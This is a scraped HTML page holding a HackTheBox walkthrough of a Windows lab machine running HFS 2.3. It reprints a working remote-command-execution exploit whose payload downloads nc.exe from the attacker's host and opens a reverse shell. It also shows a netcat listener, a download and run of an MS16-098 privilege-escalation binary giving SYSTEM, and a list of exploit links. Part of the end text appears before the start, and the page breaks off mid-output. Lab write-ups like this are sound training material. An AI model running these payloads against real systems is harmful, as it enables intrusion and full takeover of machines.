(32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC [*] [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical [*] http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC [*] [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical [*] https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC [*] http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC [*] http://www.exploit-db.com/exploits/35229/ -- Internet Explorer \u003c= 11 - OLE Automation Array Remote Code Execution (#1), PoC [*] http://www.exploit-db.com/exploits/35230/ -- Internet Explorer \u003c 11 - OLE Automation Array Remote Code Execution (MSF), MSF [*] http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF [*] http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF [*] [M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important [*] http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC [*] http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF [*] [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical [*] http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF [*] [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical [*] done In this suggestions, I found a vulnerability named MS16-098. This vulnerability can use Privilege Escalation. Details in exploit-db Since binary is provided, download with wget.\n# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe And provide it to target machine via HTTP. In target machine, download and execute it.\nc:\\Users\\kostas\\Desktop\u003epowershell wget http://10.10.14.9/41020.exe -outfile 41020.exe powershell wget http://10.10.14.9/41020.exe -outfile 41020.exe c:\\Users\\kostas\\Desktop\u003e41020.exe 41020.exe Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\\Users\\kostas\\Desktop\u003e Check privilege.\nc:\\Users\\kostas\\Desktop\u003ewhoami whoami nt authority\\system I got system privilege. Check root flag.\nc:\\Users\\kostas\\Desktop\u003e cd c:\\Users\\Administrator\\Desktop c:\\Users\\Administrator\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of c:\\Users\\Administrator\\Desktop 18/03/2017 02:14 �� . 18/03/2017 02:14 �� .. 18/03/2017 02:14 �� 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 31.889.264.640 bytes free c:\\Users\\Administrator\\Desktop\u003etype root.txt ","wordCount":"2350","inLanguage":"en","image":"http://localhost:1313/static/famasoon.jpg","datePublished":"2019-11-04T00:00:00Z","dateModified":"2019-11-04T00:00:00Z","author":{"@type":"Person","name":"FAMASoon"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/optim/"},"publisher":{"@type":"Organization","name":"x64.moe","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HackTheBox Walkthrough - Optim</h1><div class=post-meta><span title='2019-11-04 00:00:00 +0000 UTC'>November 4, 2019</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2350 words&nbsp;·&nbsp;FAMASoon&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/optim.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=about-optim>About Optim<a hidden class=anchor aria-hidden=true href=#about-optim>#</a></h2><p><a href=https://www.hackthebox.eu/home/machines/profile/6>Optim</a></p><h2 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h2><p>Port scan result</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2019-11-03 09:55 EST
</span></span><span class=line><span class=cl>Stats: 0:06:29 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.32% <span class=k>done</span><span class=p>;</span> ETC: 10:01 <span class=o>(</span>0:00:02 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Stats: 0:14:57 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.32% <span class=k>done</span><span class=p>;</span> ETC: 10:10 <span class=o>(</span>0:00:06 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.8
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.25s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>999</span> filtered ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    HttpFileServer httpd 2.3
</span></span><span class=line><span class=cl><span class=p>|</span>_clamav-exec: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-csrf: Couldn<span class=s1>&#39;t find any CSRF vulnerabilities.
</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
</span></span><span class=line><span class=cl><span class=p>|</span> http-fileupload-exploiter: 
</span></span><span class=line><span class=cl><span class=p>|</span>   
</span></span><span class=line><span class=cl><span class=p>|</span>_    Couldn<span class=s1>&#39;t find a file-type field.
</span></span></span><span class=line><span class=cl><span class=s1>| http-method-tamper: 
</span></span></span><span class=line><span class=cl><span class=s1>|   VULNERABLE:
</span></span></span><span class=line><span class=cl><span class=s1>|   Authentication bypass by HTTP verb tampering
</span></span></span><span class=line><span class=cl><span class=s1>|     State: VULNERABLE (Exploitable)
</span></span></span><span class=line><span class=cl><span class=s1>|       This web server contains password protected resources vulnerable to authentication bypass
</span></span></span><span class=line><span class=cl><span class=s1>|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
</span></span></span><span class=line><span class=cl><span class=s1>|        common HTTP methods and in misconfigured .htaccess files.
</span></span></span><span class=line><span class=cl><span class=s1>|              
</span></span></span><span class=line><span class=cl><span class=s1>|     Extra information:
</span></span></span><span class=line><span class=cl><span class=s1>|       
</span></span></span><span class=line><span class=cl><span class=s1>|   URIs suspected to be vulnerable to HTTP verb tampering:
</span></span></span><span class=line><span class=cl><span class=s1>|     /~login [GENERIC]
</span></span></span><span class=line><span class=cl><span class=s1>|   
</span></span></span><span class=line><span class=cl><span class=s1>|     References:
</span></span></span><span class=line><span class=cl><span class=s1>|       http://www.mkit.com.ar/labs/htexploit/
</span></span></span><span class=line><span class=cl><span class=s1>|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
</span></span></span><span class=line><span class=cl><span class=s1>|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
</span></span></span><span class=line><span class=cl><span class=s1>|_      http://capec.mitre.org/data/definitions/274.html
</span></span></span><span class=line><span class=cl><span class=s1>|_http-server-header: HFS 2.3
</span></span></span><span class=line><span class=cl><span class=s1>|_http-stored-xss: Couldn&#39;</span>t find any stored XSS vulnerabilities.
</span></span><span class=line><span class=cl><span class=p>|</span> http-vuln-cve2011-3192: 
</span></span><span class=line><span class=cl><span class=p>|</span>   VULNERABLE:
</span></span><span class=line><span class=cl><span class=p>|</span>   Apache byterange filter DoS
</span></span><span class=line><span class=cl><span class=p>|</span>     State: VULNERABLE
</span></span><span class=line><span class=cl><span class=p>|</span>     IDs:  BID:49303  CVE:CVE-2011-3192
</span></span><span class=line><span class=cl><span class=p>|</span>       The Apache web server is vulnerable to a denial of service attack when numerous
</span></span><span class=line><span class=cl><span class=p>|</span>       overlapping byte ranges are requested.
</span></span><span class=line><span class=cl><span class=p>|</span>     Disclosure date: 2011-08-19
</span></span><span class=line><span class=cl><span class=p>|</span>     References:
</span></span><span class=line><span class=cl><span class=p>|</span>       https://www.tenable.com/plugins/nessus/55976
</span></span><span class=line><span class=cl><span class=p>|</span>       https://www.securityfocus.com/bid/49303
</span></span><span class=line><span class=cl><span class=p>|</span>       https://seclists.org/fulldisclosure/2011/Aug/175
</span></span><span class=line><span class=cl><span class=p>|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2011-3192
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1150.10 seconds
</span></span></code></pre></div><h2 id=web-browsing>Web browsing<a hidden class=anchor aria-hidden=true href=#web-browsing>#</a></h2><p>Accessed with browser</p><p><img loading=lazy src=https://i.imgur.com/UPuQVQz.png alt></p><p>This machine is using HFS.</p><h2 id=searchsploit>Searchsploit<a hidden class=anchor aria-hidden=true href=#searchsploit>#</a></h2><p>I found HFS vulnerability.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># searchsploit HFS</span>
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                                                        <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>                                                                                                                                      <span class=p>|</span> <span class=o>(</span>/usr/share/exploitdb/<span class=o>)</span>
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl>Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                                     <span class=p>|</span> exploits/osx/dos/29454.txt
</span></span><span class=line><span class=cl>Apple Mac OSX 10.6 - HFS FileSystem <span class=o>(</span>Denial of Service<span class=o>)</span>                                                                               <span class=p>|</span> exploits/osx/dos/12375.c
</span></span><span class=line><span class=cl>Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                                           <span class=p>|</span> exploits/osx/local/35488.c
</span></span><span class=line><span class=cl>Apple Mac OSX xnu 1228.x - <span class=s1>&#39;hfs-fcntl&#39;</span> Kernel Privilege Escalation                                                                    <span class=p>|</span> exploits/osx/local/8266.txt
</span></span><span class=line><span class=cl>FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                                            <span class=p>|</span> exploits/windows/remote/37985.py
</span></span><span class=line><span class=cl>Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                                           <span class=p>|</span> exploits/linux/dos/28895.txt
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> - Remote Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                                                                <span class=p>|</span> exploits/windows/remote/34926.rb
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> 1.5/2.x - Multiple Vulnerabilities                                                                     <span class=p>|</span> exploits/windows/remote/31056.py
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> 2.2/2.3 - Arbitrary File Upload                                                                        <span class=p>|</span> exploits/multiple/remote/30850.txt
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> 2.3.x - Remote Command Execution <span class=o>(</span>1<span class=o>)</span>                                                                   <span class=p>|</span> exploits/windows/remote/34668.txt
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> 2.3.x - Remote Command Execution <span class=o>(</span>2<span class=o>)</span>                                                                   <span class=p>|</span> exploits/windows/remote/39161.py
</span></span><span class=line><span class=cl>Rejetto HTTP File Server <span class=o>(</span>HFS<span class=o>)</span> 2.3a/2.3b/2.3c - Remote Command Execution                                                              <span class=p>|</span> exploits/windows/webapps/34852.txt
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Result
</span></span></code></pre></div><p>I used RCE exploit code <code>exploits/windows/remote/39161.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># cp /usr/share/exploitdb/exploits/windows/remote/39161.py</span>
</span></span></code></pre></div><p>The contents of <code>39161.py</code> are as follows.
(I rewrite <code>ip_addr</code> and <code>local_port</code>)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Title: HttpFileServer 2.3.x Remote Command Execution</span>
</span></span><span class=line><span class=cl><span class=c1># Google Dork: intext:&#34;httpfileserver 2.3&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 04-01-2016</span>
</span></span><span class=line><span class=cl><span class=c1># Remote: Yes</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Avinash Kumar Thapa aka &#34;-Acid&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: http://rejetto.com/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: http://sourceforge.net/projects/hfs/</span>
</span></span><span class=line><span class=cl><span class=c1># Version: 2.3.x</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Windows Server 2008 , Windows 8, Windows 7</span>
</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2014-6287</span>
</span></span><span class=line><span class=cl><span class=c1># Description: You can use HFS (HTTP File Server) to send and receive files.</span>
</span></span><span class=line><span class=cl><span class=c1>#              It&#39;s different from classic file sharing because it uses web technology to be more compatible with today&#39;s Internet.</span>
</span></span><span class=line><span class=cl><span class=c1>#              It also differs from classic web servers because it&#39;s very easy to use and runs &#34;right out-of-the box&#34;. Access your remote files, over the network. It has been successfully tested with Wine under Linux. </span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=c1>#Usage : python Exploit.py &lt;Target IP address&gt; &lt;Target Port Number&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe).  </span>
</span></span><span class=line><span class=cl><span class=c1>#          You may need to run it multiple times for success!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib2</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>script_create</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=n>urllib2</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;:&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;/?search=%00{.+&#34;</span><span class=o>+</span><span class=n>save</span><span class=o>+</span><span class=s2>&#34;.}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>execute_script</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=n>urllib2</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;:&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;/?search=%00{.+&#34;</span><span class=o>+</span><span class=n>exe</span><span class=o>+</span><span class=s2>&#34;.}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>nc_run</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=n>urllib2</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;:&#34;</span><span class=o>+</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;/?search=%00{.+&#34;</span><span class=o>+</span><span class=n>exe1</span><span class=o>+</span><span class=s2>&#34;.}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ip_addr</span> <span class=o>=</span> <span class=s2>&#34;10.10.14.9&#34;</span> <span class=c1>#local IP address</span>
</span></span><span class=line><span class=cl>        <span class=n>local_port</span> <span class=o>=</span> <span class=s2>&#34;8888&#34;</span> <span class=c1># Local Port number</span>
</span></span><span class=line><span class=cl>        <span class=n>vbs</span> <span class=o>=</span> <span class=s2>&#34;C:\Users\Public\script.vbs|dim</span><span class=si>%20x</span><span class=s2>Http%3A%20Set</span><span class=si>%20x</span><span class=s2>Http</span><span class=si>%20%</span><span class=s2>3D</span><span class=si>%20c</span><span class=s2>reateobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm</span><span class=si>%20%</span><span class=s2>3D</span><span class=si>%20c</span><span class=s2>reateobject(%22Adodb.Stream%22)%0D%0AxHttp.Open</span><span class=si>%20%</span><span class=s2>22GET</span><span class=si>%22%</span><span class=s2>2C</span><span class=si>%20%</span><span class=s2>22http%3A</span><span class=si>%2F%2F</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>ip_addr</span><span class=o>+</span><span class=s2>&#34;</span><span class=si>%2F</span><span class=s2>nc.exe</span><span class=si>%22%</span><span class=s2>2C</span><span class=si>%20F</span><span class=s2>alse%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A</span><span class=si>%20%</span><span class=s2>20</span><span class=si>%20%</span><span class=s2>20.type</span><span class=si>%20%</span><span class=s2>3D</span><span class=si>%201%</span><span class=s2>20</span><span class=si>%27%</span><span class=s2>2F</span><span class=si>%2F</span><span class=s2>binary%0D%0A</span><span class=si>%20%</span><span class=s2>20</span><span class=si>%20%</span><span class=s2>20.open%0D%0A</span><span class=si>%20%</span><span class=s2>20</span><span class=si>%20%</span><span class=s2>20.write</span><span class=si>%20x</span><span class=s2>Http.responseBody%0D%0A</span><span class=si>%20%</span><span class=s2>20</span><span class=si>%20%</span><span class=s2>20.savetofile</span><span class=si>%20%</span><span class=s2>22C%3A%5CUsers%5CPublic%5Cnc.exe</span><span class=si>%22%</span><span class=s2>2C</span><span class=si>%202%</span><span class=s2>20</span><span class=si>%27%</span><span class=s2>2F</span><span class=si>%2F</span><span class=s2>overwrite%0D%0Aend%20with&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>save</span><span class=o>=</span> <span class=s2>&#34;save|&#34;</span> <span class=o>+</span> <span class=n>vbs</span>
</span></span><span class=line><span class=cl>        <span class=n>vbs2</span> <span class=o>=</span> <span class=s2>&#34;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>exe</span><span class=o>=</span> <span class=s2>&#34;exec|&#34;</span><span class=o>+</span><span class=n>vbs2</span>
</span></span><span class=line><span class=cl>        <span class=n>vbs3</span> <span class=o>=</span> <span class=s2>&#34;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e</span><span class=si>%20c</span><span class=s2>md.exe%20&#34;</span><span class=o>+</span><span class=n>ip_addr</span><span class=o>+</span><span class=s2>&#34;%20&#34;</span><span class=o>+</span><span class=n>local_port</span>
</span></span><span class=line><span class=cl>        <span class=n>exe1</span><span class=o>=</span> <span class=s2>&#34;exec|&#34;</span><span class=o>+</span><span class=n>vbs3</span>
</span></span><span class=line><span class=cl>        <span class=n>script_create</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>execute_script</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>nc_run</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s2>&#34;&#34;&#34;[.]Something went wrong..!
</span></span></span><span class=line><span class=cl><span class=s2>        Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        Don&#39;t forgot to change the Local IP address and Port number on the script&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>Find <code>nc.exe</code> and copy it for <code>39161.py</code>.
And start the HTTP server so that the target machine can download <code>nc.exe</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># locate nc.exe</span>
</span></span><span class=line><span class=cl>/usr/share/sqlninja/apps/nc.exe
</span></span><span class=line><span class=cl>/usr/share/windows-resources/binaries/nc.exe
</span></span><span class=line><span class=cl><span class=c1># cp /usr/share/windows-resources/binaries/nc.exe</span>
</span></span><span class=line><span class=cl><span class=c1># python -m SimpleHTTPServer 80</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> ...
</span></span></code></pre></div><p>Execute <code>nc</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># nc -lnvp 8888</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>8888</span> ...
</span></span></code></pre></div><p>Execute <code>39161.py</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># ./39161.py 10.10.10.8 80</span>
</span></span></code></pre></div><p>If the following message appears in the HTTPS server log, it is successful.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>10.10.10.8 - - <span class=o>[</span>03/Nov/2019 11:17:40<span class=o>]</span> <span class=s2>&#34;GET /nc.exe HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><p>I got a Windows reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.9<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.8<span class=o>]</span> <span class=m>49190</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.3.9600<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>I got user flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is D0BC-0196
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10/11/2019  01:53 ��    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>10/11/2019  01:53 ��    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>18/03/2017  02:11 ��           760.320 hfs.exe
</span></span><span class=line><span class=cl>18/03/2017  02:13 ��                <span class=m>32</span> user.txt.txt
</span></span><span class=line><span class=cl>               <span class=m>2</span> File<span class=o>(</span>s<span class=o>)</span>        760.352 bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  31.895.023.616 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;type user.txt.txt
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>I checked systeminfo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\k</span>ostas<span class=se>\D</span>esktop&gt;systeminfo
</span></span><span class=line><span class=cl>systeminfo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host Name:                 OPTIMUM
</span></span><span class=line><span class=cl>OS Name:                   Microsoft Windows Server <span class=m>2012</span> R2 Standard
</span></span><span class=line><span class=cl>OS Version:                6.3.9600 N/A Build <span class=m>9600</span>
</span></span><span class=line><span class=cl>OS Manufacturer:           Microsoft Corporation
</span></span><span class=line><span class=cl>OS Configuration:          Standalone Server
</span></span><span class=line><span class=cl>OS Build Type:             Multiprocessor Free
</span></span><span class=line><span class=cl>Registered Owner:          Windows User
</span></span><span class=line><span class=cl>Registered Organization:   
</span></span><span class=line><span class=cl>Product ID:                00252-70000-00000-AA535
</span></span><span class=line><span class=cl>Original Install Date:     18/3/2017, 1:51:36 ��
</span></span><span class=line><span class=cl>System Boot Time:          10/11/2019, 1:51:48 ��
</span></span><span class=line><span class=cl>System Manufacturer:       VMware, Inc.
</span></span><span class=line><span class=cl>System Model:              VMware Virtual Platform
</span></span><span class=line><span class=cl>System Type:               x64-based PC
</span></span><span class=line><span class=cl>Processor<span class=o>(</span>s<span class=o>)</span>:              <span class=m>1</span> Processor<span class=o>(</span>s<span class=o>)</span> Installed.
</span></span><span class=line><span class=cl>                           <span class=o>[</span>01<span class=o>]</span>: AMD64 Family <span class=m>23</span> Model <span class=m>1</span> Stepping <span class=m>2</span> AuthenticAMD ~2000 Mhz
</span></span><span class=line><span class=cl>BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
</span></span><span class=line><span class=cl>Windows Directory:         C:<span class=se>\W</span>indows
</span></span><span class=line><span class=cl>System Directory:          C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32
</span></span><span class=line><span class=cl>Boot Device:               <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume1
</span></span><span class=line><span class=cl>System Locale:             el<span class=p>;</span>Greek
</span></span><span class=line><span class=cl>Input Locale:              en-us<span class=p>;</span>English <span class=o>(</span>United States<span class=o>)</span>
</span></span><span class=line><span class=cl>Time Zone:                 <span class=o>(</span>UTC+02:00<span class=o>)</span> Athens, Bucharest
